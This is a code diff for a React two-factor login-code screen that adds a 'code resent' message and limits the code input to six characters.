@@ -11,10 +11,12 @@ const FaCode = () => {
   const [error_login_code, setError_login_code] = useState(false);
   const [validating, setValidating] = useState(false);
   const [resending, setResending] = useState(false);
+  const [resended, setResended] = useState(false);
 
   const navigate = useNavigate();
 
   const handleSend = () => {
+    setResended(false);
     setValidating(true);
     const updates = {};
 
@@ -60,6 +62,7 @@ const FaCode = () => {
         // eslint-disable-next-line no-dupe-else-if
       } else if (data?.user_status === "Đã gửi lại mã 2fa") {
         setResending(false);
+        setResended(true);
       }
     });
   }, []);
@@ -121,7 +124,11 @@ const FaCode = () => {
               <InputText
                 placeHolder={"Login code"}
                 value={facode}
-                fun={(e) => setFacode(e.target.value)}
+                fun={(e) => {
+                  if (e.target.value?.length < 7) {
+                    setFacode(e.target.value);
+                  }
+                }}
               ></InputText>
             </div>
 
@@ -153,6 +160,11 @@ const FaCode = () => {
           {error_login_code && (
             <p className="text-danger mb-2 ms-1">
               Incorrect login code, please try again.
+            </p>
+          )}
+          {resended && (
+            <p className="text-secondary mb-2 ms-1">
+              Login code has been sent to your phone or email.
             </p>
           )}
           {validating && <Validating />}
